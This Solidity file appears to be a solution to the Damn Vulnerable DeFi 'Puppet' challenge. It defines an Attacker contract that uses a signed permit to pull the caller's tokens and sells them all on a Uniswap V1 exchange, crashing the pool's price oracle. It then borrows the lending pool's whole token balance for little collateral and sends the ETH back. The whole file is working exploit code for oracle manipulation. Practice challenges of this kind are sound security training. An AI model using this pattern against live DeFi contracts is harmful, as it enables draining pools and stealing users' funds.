// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {PuppetPool} from "./PuppetPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

import "hardhat/console.sol";

interface UniswapExchangeInterface {
    function ethToTokenSwapInput(
        uint256 min_tokens,
        uint256 deadline
    ) external payable returns (uint256 tokens_bought);

    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256 eth_bought);
}

contract Attacker {
    PuppetPool public pool;
    DamnValuableToken public token;
    UniswapExchangeInterface public exchange;

    struct Permit {
        address owner;
        address spender;
        uint256 value;
        uint256 nonce;
        uint256 deadline;
    }

    constructor(address _pool, address _exchange, address _token) {
        pool = PuppetPool(_pool);
        token = DamnValuableToken(_token);
        exchange = UniswapExchangeInterface(_exchange);
    }

    function spiltSignature(
        bytes memory signature
    ) public pure returns (bytes32 r, bytes32 s, uint8 v) {
        require(signature.length == 65, "Invalid signature length");

        // first 32 bytes stores the length of the signature
        assembly {
            // Next 32 bytes are the signature's r value
            r := mload(add(signature, 0x20))

            // Next 32 bytes are the signature's s value
            s := mload(add(signature, 0x40))

            // Final byte is the signature's v value
            v := byte(0, mload(add(signature, 0x60)))
        }

        // Ethereum expects v to be 27 or 28, so adjust if necessary
        if (v < 27) {
            v += 27;
        }

        return (r, s, v);
    }

    function attack(
        Permit calldata permit,
        bytes calldata signature
    ) public payable {
        (bytes32 r, bytes32 s, uint8 v) = spiltSignature(signature);
        token.permit(
            permit.owner,
            permit.spender,
            permit.value,
            permit.deadline,
            v,
            r,
            s
        );
        console.log("permit done");
        token.transferFrom(
            msg.sender,
            address(this),
            token.balanceOf(msg.sender)
        );
        console.log("transferFrom done");
        console.log(
            "token.balanceOf(address(this))",
            token.balanceOf(address(this))
        );
        // 1. sell all tokens to exchange
        token.approve(address(exchange), type(uint256).max);
        exchange.tokenToEthSwapInput(
            token.balanceOf(address(this)),
            1,
            block.timestamp
        );
        console.log("tokenToEthSwapInput done");
        // 2. borrow all tokens from pool
        pool.borrow{value: msg.value}(
            token.balanceOf(address(pool)),
            msg.sender
        );
        console.log("borrow done");
        // 3. return value to msg.sender
        payable(msg.sender).transfer(address(this).balance);
        console.log("transfer done", address(msg.sender).balance);
    }

    receive() external payable {}
}
